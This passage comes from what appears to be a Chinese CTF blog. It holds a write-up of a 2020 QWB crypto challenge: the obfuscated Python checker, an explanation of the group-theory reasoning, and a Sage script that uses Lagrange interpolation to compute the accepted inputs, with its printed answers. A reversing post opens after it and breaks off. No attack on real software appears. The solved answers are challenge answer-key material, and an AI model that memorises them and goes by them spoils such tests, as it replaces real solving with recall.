class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">from</span> IPython <span class="keyword">import</span> embed</span><br><span class="line"></span><br><span class="line">rrt = [</span><br><span class="line">    <span class="number">0x1F0C22AD1FC79BAD9998E741F118A0E4DC6186734A25A072CB657AC3E9B05DB5F30451DD9E8F4BE8F</span>,</span><br><span class="line">    -<span class="number">0xF8611568FE3CDD6CCCC73A0F88C50726E30C339A512D03965B2BD61F4D82EDAF98228EECF47A5F48</span>,</span><br><span class="line">    <span class="number">0xA81F883356FCE6CC28C3E8BBD7E1D0957F5336FA947DA83937D361F8D443638E38F1C480262E9B49</span>,</span><br><span class="line">    -<span class="number">0x1FFD4D76D7563C2929E079FD815862501DDBCF6F1B71520D3894879E8193D46F719A38A4343BF0BB</span>,</span><br><span class="line">    -<span class="number">0x258A737960D8A6770B5A88E2DBD5CB18747D7CFC0C2AEEB727E31FF15463E85B42BAEE49D9E0CC0F</span>,</span><br><span class="line">    <span class="number">0x42D8D6C7C60482107421060735391BD75AC329010148D32EC2E872178C87E382432F5B00FA07C01C</span>,</span><br><span class="line">    -<span class="number">0x11C3AC8DE06A1450EA78018E230686B2EE978E7A4D98560D51C61DE7A8362CA6DDCC45E1147B8885</span>,</span><br><span class="line">    <span class="number">0x43AA96AA8C3002C6EBB9BE5563667785F6E9DFAB912FAAF741CFBD0A03428F365E0FCE3284B3B8B3</span>,</span><br><span class="line">    <span class="number">0x7AFDE950DD9AE47637ED2C6FB7250DD4DB4B3DDE2284A9B87582E1F73C91440687E33CB2BBFC5189B</span>,</span><br><span class="line">    -<span class="number">0x3CA029BD608E714CA5F1C7B035282C42D00DF1FEB16ABD40D0F976F75EA6D3686227395F604A25676D</span>,</span><br><span class="line">    <span class="number">0x166CB92444160450747991DBBDF057BAF85916E5F0A355CCD7ECC9A0D993582AA923F5B4FB2ABABC81</span>,</span><br><span class="line">    -<span class="number">0x663E489FBDAEC80D1884477F020778B5A2D090399A17B6AE5817A8EF1EA99F655003967D3A609224FD</span>,</span><br><span class="line">    <span class="number">0x1BAB93E013E3D17B5364244083170DFE0BD5A1F99BA1643851400892E0D4AADEDF122B0507F93BC27F</span>,</span><br><span class="line">    -<span class="number">0xCC39640F78F10E9EFD61E2B44CFEE4D9117B4A3A84139BAF9C5EDA67C578021CD48C4B57E6AF0F44F</span>,</span><br><span class="line">    <span class="number">0x21F2983A517C4FAEA38B3812E0331396A03FA4F4405203C1756C0C4167589CFAABDB61429C901B23315</span>,</span><br><span class="line">    -<span class="number">0xD0043580FE877D8ED2B5DA1F3DD452925BD11D7F0A4BEB5F7614785BECE71FAF6CFE03AD64B8234D33</span>,</span><br><span class="line">    <span class="number">0x633DD371A42F8D22B2D0CB201CCB16EBBA8F405FF2B113814CE8DFDD36F81C6AE0B58158186627766A9</span>,</span><br><span class="line">    -<span class="number">0xB819D98EB71AC2A8B05296FA5FC31454AD69C910704A6EB205E2B2026BEFD69851240F5BAD1B20319</span>,</span><br><span class="line">    <span class="number">0x252235BEDC59ECEEDC518812E51AFD4724A090E89A5A10509A9F03C53C3663DCB9755DB5D90EA7311D3</span>,</span><br><span class="line">    -<span class="number">0xE2178F78C86017B224413FEAE2C4F3C32524C72BEA949AF624BA5012A7266BAE3A83036A747E10D5D05</span>,</span><br><span class="line">    <span class="number">0x605197C25F89C947BC425DA91858B982F21C31615F61418E16420CD725CA6038B7A0FF8110546470032F</span>,</span><br><span class="line">    -<span class="number">0x1B45970BD9A24B31CCF3F3DDBAF6E55F85EAB899B8256438136F66C9D6ACA008FC5EFC3A68C643F30049</span>,</span><br><span class="line">    <span class="number">0x25CAB05492FBBE7F64C1D2DAF9601F29992C5BA78F18D0AFDE3BB1267496AFDD4521F24812809F71FFBF</span>,</span><br><span class="line">    -<span class="number">0x8ED7098BC09611E0669A9D014C7E1A3B32B54801C45FE1DA070EAC5D6C2E0D77063A214ABD52D96CE97</span>,</span><br><span class="line">    <span class="number">0x2413FEDDCE36DE145AE57CD141C38176341F00E5CB8CFDB4C8DFDA319C80C8A4AFF337E49F73DF2EF06F</span>,</span><br><span class="line">    -<span class="number">0x2F3203C80A7C3442696575EDB2962C106836B1A5B8120FDAC440F06895C75F5CF034D3F586E0AD6A08479</span>,</span><br><span class="line">    <span class="number">0xF46ECA5D31CD4D7493DBFB47A83FE50B0853451DFDB346086AEDA8C1BECCCF97B60D1E9160091FF8D773</span>,</span><br><span class="line">    -<span class="number">0x3470EBC21C3C8E65D3B15C3D01681A308F65D5E69E52DB1D847C51C96D60FB0BF09CA6A3A1EAB9125D335</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">ttr = [</span><br><span class="line">    <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">240</span>, <span class="number">40320</span>, <span class="number">362880</span>, <span class="number">403200</span>, <span class="number">7983360</span>, <span class="number">11975040</span>, <span class="number">37065600</span>,</span><br><span class="line">    <span class="number">0x2E6519800</span>, <span class="number">0xA261D9400</span>, <span class="number">0x32BE93E4000</span>, <span class="number">0x466BBD9000</span>, <span class="number">0xC218F5AE8000</span>,</span><br><span class="line">    <span class="number">0x4807432BC18000</span>, <span class="number">0x21C3677C82B40000</span>, <span class="number">0xB141DF4DAE310000</span>, <span class="number">0xF3BA930ACF8360000</span>,</span><br><span class="line">    <span class="number">0x280A89874301780000</span>, <span class="number">0x5B65F7240DD14400000</span>, <span class="number">0x446E0208A903029400000</span>,</span><br><span class="line">    <span class="number">0xDE65869C2549C86100000</span>, <span class="number">0x211D3C0B03AB74E50800000</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0~29，使用分数运算计算一个大整数，基于rrt和ttr数组的有理数运算</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rrn</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="comment"># 特殊情况，rrn(17)=1, rrn(18)=0</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> (<span class="number">17</span>, <span class="number">18</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">18</span> - n</span><br><span class="line">    F = Fraction</span><br><span class="line">    n = <span class="built_in">len</span>(rrt) <span class="comment"># 28</span></span><br><span class="line">    acc = F(<span class="number">0</span>, <span class="number">1</span>) <span class="comment"># 累加</span></span><br><span class="line">    mul = F(<span class="number">1</span>, <span class="number">1</span>) <span class="comment"># 累乘</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        acc += F(rrt[i], ttr[i]) * mul</span><br><span class="line">        mul *= F(n - i, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(acc)</span><br><span class="line"></span><br><span class="line">triple = [(rrn(<span class="number">7</span>), rrn(<span class="number">8</span>), rrn(<span class="number">9</span>)), (rrn(<span class="number">10</span>), rrn(<span class="number">11</span>), rrn(<span class="number">12</span>)), (rrn(<span class="number">13</span>), rrn(<span class="number">14</span>), rrn(<span class="number">15</span>))]</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0 4144803293417776131310451317495228706499130241044716671850484110288180082374299088166459295448719</span></span><br><span class="line"><span class="string">1 2072401646708888065655225658747614353249565120522358335925242055144090041187149544083229647724359</span></span><br><span class="line"><span class="string">2 1402769202505631727601810730581776197716350949074282314174097681867464170562021714349605843278664</span></span><br><span class="line"><span class="string">3 1335174568503939352563889373190143608146136792487939183543780907770759908268721571509488188235873</span></span><br><span class="line"><span class="string">4 442427645836698445267007097625472942305363362863130591746066528455945891079759637465163543741507</span></span><br><span class="line"><span class="string">5 1132891618999846053017541510085320021631035459029704515373044135313614915469753666299478525789537</span></span><br><span class="line"><span class="string">6 3440625422497330758356285966425842805899353260932540945262402832827054563258418833844309632149096</span></span><br><span class="line"><span class="string">7 51966</span></span><br><span class="line"><span class="string">8 480442839669953990717445646260333383833736214883976558477525831992994289143305421629761482429714</span></span><br><span class="line"><span class="string">9 680701978345522085049694956190292511497787092168524280991013677878931201637910598103187515536181</span></span><br><span class="line"><span class="string">10 47806</span></span><br><span class="line"><span class="string">11 253717457675323180603201716971045682091261518437666533915787790782521696917056900361404824269689</span></span><br><span class="line"><span class="string">12 99768326317759269813131181172947299870925613919195157126671930387206518545837120733862757382354</span></span><br><span class="line"><span class="string">13 201527</span></span><br><span class="line"><span class="string">14 782319055923618868639890136618720319997476308047895888006842867173403800015590219030945524995543</span></span><br><span class="line"><span class="string">15 944213788775446264472010893716848921879528565854393198519311752189219209422386607874556309845161</span></span><br><span class="line"><span class="string">16 865967982817260602973374066425323583617367103807916127263320767485154348516392723060969424214055</span></span><br><span class="line"><span class="string">17 1</span></span><br><span class="line"><span class="string">18 0</span></span><br><span class="line"><span class="string">19 3</span></span><br><span class="line"><span class="string">20 6</span></span><br><span class="line"><span class="string">21 2</span></span><br><span class="line"><span class="string">22 4919</span></span><br><span class="line"><span class="string">23 132146363252892079238955852043754382244951307426448497798760465957265430114543661757753602857394</span></span><br><span class="line"><span class="string">24 57005</span></span><br><span class="line"><span class="string">25 775309903033854570882823603825659470664893675806480830434450057789819902048494192286724670375083</span></span><br><span class="line"><span class="string">26 48879</span></span><br><span class="line"><span class="string">27 118549588096765345719828273586922254620646262475213503758232906237813765902929584873401252181598</span></span><br><span class="line"><span class="string">28 -17927833311757106272913600706201967593825828617408413393921146586262101308545356473435323364772083605196</span></span><br><span class="line"><span class="string">29 -480626274858555850271738168267749839659770589949752910052809542789249901244053865124196593810519595669432</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 位加法运算，计算两个大数相加</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        carry = a &amp; a</span><br><span class="line">        a = a ^ b</span><br><span class="line">        b = carry &lt;&lt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="comment"># 位运算乘法，计算两个数相乘</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span> * mul(a, -b)</span><br><span class="line">    acc = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        acc += a <span class="keyword">if</span> (b &amp; <span class="number">1</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        a &lt;&lt;= <span class="number">1</span></span><br><span class="line">        b &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> acc</span><br><span class="line"><span class="comment"># 模幂运算，例如计算modexp(3, 13, 7)，也就是计算3^13 mod 7的结果res=3</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modexp</span>(<span class="params">base, exp, mod</span>):</span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line">    b = base % mod</span><br><span class="line">    e = exp</span><br><span class="line">    <span class="keyword">while</span> e:</span><br><span class="line">        <span class="keyword">if</span> e &amp; <span class="number">1</span>:</span><br><span class="line">            res = mul(res, b) % mod</span><br><span class="line">        b = mul(b, b) % mod</span><br><span class="line">        e &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">k, v1, v2</span>):</span><br><span class="line">    <span class="comment"># 获取模数</span></span><br><span class="line">    M = rrn(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 计算左边(rrn(2)^v1 * rrn(3)^v2) mod M</span></span><br><span class="line">    left = mul(modexp(rrn(<span class="number">2</span>), v1, M), modexp(rrn(<span class="number">3</span>), v2, M)) % M</span><br><span class="line">    acc, step = <span class="number">1</span>,<span class="number">1</span></span><br><span class="line">    <span class="comment"># 计算右边，累乘rrn(4)^1 * rrn(5)^k * rrn(6)^(k^2)</span></span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> [rrn(<span class="number">4</span>), rrn(<span class="number">5</span>), rrn(<span class="number">6</span>)]:</span><br><span class="line">        acc = mul(acc, modexp(val, step, M)) % M</span><br><span class="line">        step = mul(step, k) % rrn(<span class="number">1</span>) <span class="comment"># step *= k % rrn(1)</span></span><br><span class="line">    <span class="comment"># 验证左右是否相等</span></span><br><span class="line">    <span class="keyword">return</span> left == acc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展欧几里得求逆元</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">a, m</span>):</span><br><span class="line">    a0, a1 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    b0, b1 = a % m, m</span><br><span class="line">    <span class="keyword">while</span> b0 &gt; <span class="number">1</span>:</span><br><span class="line">        q = b1 // b0</span><br><span class="line">        a0, a1 = (a1 - mul(a0, q)), (b1 - mul(b0, q))</span><br><span class="line">        a0, b0, a1, b1 = a0, a1, a0, b0</span><br><span class="line">    <span class="keyword">return</span> a0 % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rtnr</span>(<span class="params">arr</span>):</span><br><span class="line">    <span class="comment"># 验证arr是否为列表或元组，且至少包含3个元素</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(arr, (<span class="built_in">list</span>, <span class="built_in">tuple</span>)) <span class="keyword">or</span> <span class="built_in">len</span>(arr) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 将arr变成键值对增加至hello</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; 原hello</span></span><br><span class="line"><span class="string">    hello = &#123;</span></span><br><span class="line"><span class="string">    rrn(7):  (rrn(8),  rrn(9)),</span></span><br><span class="line"><span class="string">    rrn(10): (rrn(11), rrn(12)),</span></span><br><span class="line"><span class="string">    rrn(13): (rrn(14), rrn(15))&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    hello = &#123;&#125;</span><br><span class="line">    hello = &#123;a: (b, c) <span class="keyword">for</span> a, b, c <span class="keyword">in</span> triple&#125;</span><br><span class="line">    <span class="keyword">for</span> a, b, c <span class="keyword">in</span> arr:</span><br><span class="line">        hello[a] = (b, c)</span><br><span class="line">    <span class="comment"># 组6</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hello) != <span class="number">6</span>: <span class="comment"># 6</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 验证hello的每一对键值对</span></span><br><span class="line">    <span class="keyword">for</span> k, (v1, v2) <span class="keyword">in</span> hello.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> verify(k, v1, v2):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># rrn(22), rrn(24),  rrn(26)</span></span><br><span class="line">        chosen = &#123;a <span class="keyword">for</span> a, b, c <span class="keyword">in</span> arr[:<span class="number">3</span>]&#125; </span><br><span class="line">        <span class="comment"># picked = [(rrn(22), a), (rrn(24), b), (rrn(26), c)]</span></span><br><span class="line">        picked = [(x, hello[x][<span class="number">0</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">sorted</span>(chosen) <span class="keyword">if</span> x <span class="keyword">in</span> hello]</span><br><span class="line">        <span class="comment"># [(rrn(7), rrn(9)), (rrn(10), rrn(12)), (rrn(13), rrn(15))]</span></span><br><span class="line">        leftovers = [(a, c) <span class="keyword">for</span> a, c, _ <span class="keyword">in</span> triple]  <span class="comment"># 原三元组里挑两个</span></span><br><span class="line">        rnrn = []</span><br><span class="line">        <span class="comment"># rnrn = [(rrn(22), a), (rrn(7), rrn(9)), (rrn(10), rrn(12))]</span></span><br><span class="line">        <span class="keyword">if</span> picked:</span><br><span class="line">            rnrn.append(picked[<span class="number">0</span>])</span><br><span class="line">        rnrn.extend(leftovers[:<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(rnrn) &lt; <span class="number">3</span>:</span><br><span class="line">            <span class="comment"># 修正非法解包 True</span></span><br><span class="line">            rnrn = <span class="built_in">list</span>(((k, <span class="literal">True</span>) <span class="keyword">for</span> k, (tmp, v2) <span class="keyword">in</span> <span class="built_in">sorted</span>(hello.items())))[:<span class="number">3</span>]</span><br><span class="line">        base = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 遍历rnrn的每一个点，</span></span><br><span class="line">        <span class="keyword">for</span> idx, (x, y) <span class="keyword">in</span> <span class="built_in">enumerate</span>(rnrn):</span><br><span class="line">            prod, sum_ = <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> j, (xj, yj) <span class="keyword">in</span> <span class="built_in">enumerate</span>(rnrn):</span><br><span class="line">                <span class="keyword">if</span> idx == j:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                prod = mul(prod, -xj) % rrn(<span class="number">1</span>)</span><br><span class="line">                sum_ = mul(sum_, x - xj) % rrn(<span class="number">1</span>)</span><br><span class="line">            tmp_ = mul(prod, inv(sum_, rrn(<span class="number">1</span>))) % rrn(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 输入3个字符串，转换为int</span></span><br><span class="line">    a = <span class="built_in">int</span>.from_bytes(<span class="built_in">input</span>(<span class="string">&#x27;1:&#x27;</span>).strip().encode())</span><br><span class="line">    b = <span class="built_in">int</span>.from_bytes(<span class="built_in">input</span>(<span class="string">&#x27;2:&#x27;</span>).strip().encode())</span><br><span class="line">    c = <span class="built_in">int</span>.from_bytes(<span class="built_in">input</span>(<span class="string">&#x27;3:&#x27;</span>).strip().encode())</span><br><span class="line">    <span class="comment"># 打印rrn(0)到rrn(29)的值</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        <span class="built_in">print</span>(i, rrn(i))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> ipdb; ipdb.set_trace()</span><br><span class="line">    <span class="comment"># embed()</span></span><br><span class="line">    ok = rtnr(([rrn(<span class="number">22</span>), a , rrn(<span class="number">23</span>)], [rrn(<span class="number">24</span>), b, rrn(<span class="number">25</span>)], [rrn(<span class="number">26</span>), c, rrn(<span class="number">27</span>)]))</span><br><span class="line">    <span class="keyword">if</span> ok:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Success!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Fail&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>$$rrn(2)^{v1}*rrn(3)^{v2} \equiv rrn(4)<em>rrn(5)^{k}</em> rrn(6)^{k^2} \mod rrn(0)$$</p>
<p>对于模M的乘法群，由于M是素数，所以这个群包含所有与M互素的数，也就是1到M-1的所有整数。rrn(0-29)均在模M的乘法群中，且理论上可以相互表示（群里的元素理论上均可以由同一个生成元生成）。</p>
<p>对于以上式子，可令g&#x3D;rrn(2)，h&#x3D;rrn(3)，那么按照群元素可互相转化的性质将4、5、6转化为</p>
<p>$$rrn(4)&#x3D;g^{a_1}<em>h^{a_2} \ rrn(5)&#x3D;g^{a_3}<em>h^{a_4} \ rrn(6)&#x3D;g^{a_5}<em>h^{a_6} \ 那么g^{v1}<em>h^{v2} \equiv g^{a_1+a_3</em>k+a_5</em>k^2}<em>h^{a_2+a_4</em>k+a_6</em>k^2} \mod M\ 可得v1\equiv a_1+a_3</em>k+a_5<em>k^2 \mod org(g),v2\equiv a_2+a_4</em>k+a_6*k^2 \mod org(h)$$</p>
<p>而对于模M的乘法群，由于M是素数，其乘法群的阶是 ϕ(M)&#x3D;M−1，并发现ϕ(M)&#x3D;M−1&#x3D;2⋅rrn(1)，且verify(k, v1, v2)函数中，<code>step = mul(step, k) % rrn(1)</code>可以看出，所有的k必须都能整除rrn(1)，因此可认为rrn(1)是群的阶，所以群元素g和h的阶也是rrn(1)，即</p>
<p>$$g^{rrn(1)}≡1\mod M\ 且h^{rrn(1)}≡1\mod M$$</p>
<p>因此化简后可得</p>
<p>$$v1\equiv a_1+a_3<em>k+a_5</em>k^2 \mod rrn(1)\ v2\equiv a_2+a_4<em>k+a_6</em>k^2 \mod rrn(1)$$</p>
<p>将triple中的三组数带入，拉格朗日插值即可求得多项式系数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage exp.sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">q = <span class="number">2072401646708888065655225658747614353249565120522358335925242055144090041187149544083229647724359</span></span><br><span class="line">triple = [(<span class="number">51966</span>, <span class="number">480442839669953990717445646260333383833736214883976558477525831992994289143305421629761482429714</span>, <span class="number">680701978345522085049694956190292511497787092168524280991013677878931201637910598103187515536181</span>), (<span class="number">47806</span>, <span class="number">253717457675323180603201716971045682091261518437666533915787790782521696917056900361404824269689</span>, <span class="number">99768326317759269813131181172947299870925613919195157126671930387206518545837120733862757382354</span>), (<span class="number">201527</span>, <span class="number">782319055923618868639890136618720319997476308047895888006842867173403800015590219030945524995543</span>, <span class="number">944213788775446264472010893716848921879528565854393198519311752189219209422386607874556309845161</span>)]</span><br><span class="line"></span><br><span class="line">Fq = GF(q) </span><br><span class="line">points_v1 = [(Fq(point[<span class="number">0</span>]), Fq(point[<span class="number">1</span>])) <span class="keyword">for</span> point <span class="keyword">in</span> triple] <span class="comment"># [(k1, v11), (k2, v12), (k3, v13)]</span></span><br><span class="line">points_v2 = [(Fq(point[<span class="number">0</span>]), Fq(point[<span class="number">2</span>])) <span class="keyword">for</span> point <span class="keyword">in</span> triple] <span class="comment"># [(k1, v21), (k2, v22), (k3, v23)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拟合 P1(k) = a1 + a3*k + a5*k^2</span></span><br><span class="line">R.&lt;x&gt; = Fq[] <span class="comment"># 定义多项式环</span></span><br><span class="line">P1 = R.lagrange_polynomial(points_v1) </span><br><span class="line"><span class="comment"># 拟合 P2(k) = a2 + a4*k + a6*k^2</span></span><br><span class="line">P2 = R.lagrange_polynomial(points_v2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从多项式中提取系数</span></span><br><span class="line">coeffs_P1 = P1.coefficients(sparse=<span class="literal">False</span>)</span><br><span class="line">coeffs_P2 = P2.coefficients(sparse=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">a1 = coeffs_P1[<span class="number">0</span>] </span><br><span class="line">a3 = coeffs_P1[<span class="number">1</span>] </span><br><span class="line">a5 = coeffs_P1[<span class="number">2</span>] </span><br><span class="line">a2 = coeffs_P2[<span class="number">0</span>] </span><br><span class="line">a4 = coeffs_P2[<span class="number">1</span>] </span><br><span class="line">a6 = coeffs_P2[<span class="number">2</span>] </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a1 = <span class="subst">&#123;a1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a2 = <span class="subst">&#123;a2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a3 = <span class="subst">&#123;a3&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a4 = <span class="subst">&#123;a4&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a5 = <span class="subst">&#123;a5&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a6 = <span class="subst">&#123;a6&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">rrn_22 = <span class="number">4919</span></span><br><span class="line">rrn_23 = <span class="number">132146363252892079238955852043754382244951307426448497798760465957265430114543661757753602857394</span></span><br><span class="line">rrn_24 = <span class="number">57005</span></span><br><span class="line">rrn_25 = <span class="number">775309903033854570882823603825659470664893675806480830434450057789819902048494192286724670375083</span></span><br><span class="line">rrn_26 = <span class="number">48879</span></span><br><span class="line">rrn_27 = <span class="number">118549588096765345719828273586922254620646262475213503758232906237813765902929584873401252181598</span></span><br><span class="line"></span><br><span class="line">a = a1 + a3 * Fq(rrn_22) + a5 * Fq(rrn_22)^<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">b = a1 + a3 * Fq(rrn_24) + a5 * Fq(rrn_24)^<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line">c = a1 + a3 * Fq(rrn_26) + a5 * Fq(rrn_26)^<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a1 = 559316565023500509472163049993035746991488808927332730492353543246322747488347594956218118830404</span></span><br><span class="line"><span class="string">a2 = 1455816338850548710226747826263500417489966228905173140760493856591277816261361853858359905028757</span></span><br><span class="line"><span class="string">a3 = 61893902729035082547018799981240740998667540081489595699162471822753113067844662646155561908655</span></span><br><span class="line"><span class="string">a4 = 301313555011896194349617605836195674760724652611645297927675988618321527633812527039080942153758</span></span><br><span class="line"><span class="string">a5 = 764625183014257783434933122874897790769847061090472271865906840925207049997560904718466470592181</span></span><br><span class="line"><span class="string">a6 = 1724301671569624190613193288495336271846478444752336504588582046652263520640553017091593670065559</span></span><br><span class="line"><span class="string">a = 871181771745415129676783034365082444498012594504484743519181302778728946421478110926096857920105</span></span><br><span class="line"><span class="string">b = 921176108142183962611682249614034391224389411635109144346285880896767581601955961667920137908837</span></span><br><span class="line"><span class="string">c = 794359266103212238415902312276062123896424792163905951086179313000078369166756222741109039129213</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/18/qwb2020-crypto/" data-id="cuidOvvP1WG2XapC7cKqzMiPm" data-title="qwb2020-crypto" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-qwb2020-re" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/12/15/qwb2020-re/" class="article-date">
  <time class="dt-published" datetime="2023-12-15T02:50:24.000Z" itemprop="datePublished">2023-12-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/12/15/qwb2020-re/">qwb2020-re</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>感觉比2019年的难多了</p>
<h1 id="2020-re-firmware"><a href="#2020-re-firmware" class="headerlink" title="2020 re firmware"></a>2020 re firmware</h1><p>411820</p>
<p>400620</p>
<p>4006a8</p>
<p>4006fc</p>
<p><img src="/1763434247559-17.png" alt="img"></p>
<p>取s1地址处第一个字节&lt;&lt;2 + v0</p>
